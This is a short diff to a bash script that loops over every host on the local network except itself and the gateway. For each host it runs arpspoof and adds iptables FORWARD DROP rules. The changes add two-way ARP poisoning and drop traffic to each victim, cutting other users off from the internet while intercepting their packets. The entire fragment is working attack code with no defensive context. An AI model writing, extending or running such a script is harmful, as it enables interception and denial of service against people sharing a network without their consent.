@@ -33,8 +33,10 @@ for IP in $(get_all_ips); do
     if [[ "$IP" != "$MYIP" && "$IP" != "$GATEWAY" ]]; then
         # Block this IP from forwarding to the internet
         iptables -A FORWARD -s "$IP" -j DROP
+        iptables -I FORWARD -d "$IP" -j DROP
         # Start arpspoof for this IP
         arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
+        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
     fi
 done
 
